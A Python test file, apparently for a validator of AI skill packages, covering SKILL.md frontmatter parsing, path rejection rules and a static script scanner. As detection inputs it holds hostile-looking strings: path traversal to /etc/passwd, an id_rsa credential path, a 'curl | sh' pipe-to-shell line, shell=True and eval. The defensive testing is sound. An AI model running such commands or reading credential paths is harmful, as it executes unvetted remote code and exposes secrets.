"""Skill 包规范测试：SKILL.md 解析、封闭路径、静态脚本扫描（05 §10.1 / 5.5）。"""
from __future__ import annotations

import pytest

from ai_native.modules.catalog_registry.domain.skill import (
    SkillPackage,
    SkillPackageError,
    parse_skill_md,
    scan_script,
    validate_package,
    validate_rel_path,
)


def test_parse_frontmatter_and_body() -> None:
    fm, body = parse_skill_md("---\nname: foo\ndescription: d\n---\n正文内容")
    assert fm["name"] == "foo"
    assert body == "正文内容"


def test_parse_missing_frontmatter() -> None:
    with pytest.raises(SkillPackageError):
        parse_skill_md("没有 frontmatter 的正文")


def test_closed_path_rejections() -> None:
    assert validate_rel_path("../etc/passwd") == "PATH_TRAVERSAL"
    assert validate_rel_path("/etc/passwd") == "PATH_ABSOLUTE"
    assert validate_rel_path("C:\\\\win") == "PATH_ABSOLUTE"
    assert validate_rel_path("a\\b") == "PATH_BACKSLASH"
    assert validate_rel_path(".git/config") == "PATH_DOTFILE"
    assert validate_rel_path("scripts/id_rsa") == "PATH_CREDENTIAL"
    assert validate_rel_path("scripts/check.sh") is None


def test_scan_script_flags_danger() -> None:
    assert "SCRIPT_SHELL" in scan_script("import subprocess; subprocess.run('x', shell=True)")
    assert "SCRIPT_PIPE_CURL" in scan_script("curl -s http://x | sh")
    assert scan_script("print('hello')") == []


def test_validate_package_diagnostics() -> None:
    pkg = SkillPackage(skill_key="bad key!", name="", description="", body="", scripts={"../x.sh": "eval('x')"})
    diags = validate_package(pkg)
    assert any("SKILL_INVALID_KEY" in d for d in diags)
    assert any("PATH_TRAVERSAL" in d for d in diags)
    assert any("SCRIPT_EVAL" in d for d in diags)


def test_valid_package_no_diagnostics() -> None:
    pkg = SkillPackage(skill_key="code-review", name="代码审查", description="d", body="b",
                       scripts={"scripts/check.sh": "echo ok"})
    assert validate_package(pkg) == []